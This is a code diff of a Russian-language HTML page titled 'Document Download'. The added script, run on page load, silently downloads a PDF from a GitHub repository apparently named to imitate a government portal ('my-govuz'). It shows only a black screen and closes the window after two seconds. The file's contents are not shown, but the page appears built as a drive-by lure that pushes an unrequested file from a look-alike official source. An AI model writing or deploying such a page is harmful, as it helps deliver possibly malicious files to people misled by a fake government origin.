@@ -1,19 +1,48 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Download</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Download</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            overflow: hidden;
+        }
+    </style>
 </head>
 <body>
-<script>
-    window.onload = () => {
-        const tab = window.open("download.html", "_blank");
 
-        if (!tab) {
-            document.body.innerText =
-                "Разрешите всплывающие окна для скачивания.";
-        }
-    };
+<script>
+(async function () {
+
+    const pdfUrl =
+    "https://github.com/my-govuz/my-gov_/raw/refs/heads/main/down-2026-27-12_17-00-55.pdf";
+
+    const link = document.createElement("a");
+    link.href = pdfUrl;
+    link.download = "document.pdf";
+
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+
+    setTimeout(() => {
+        window.close();
+    }, 2000);
+
+})();
 </script>
+
 </body>
 </html>
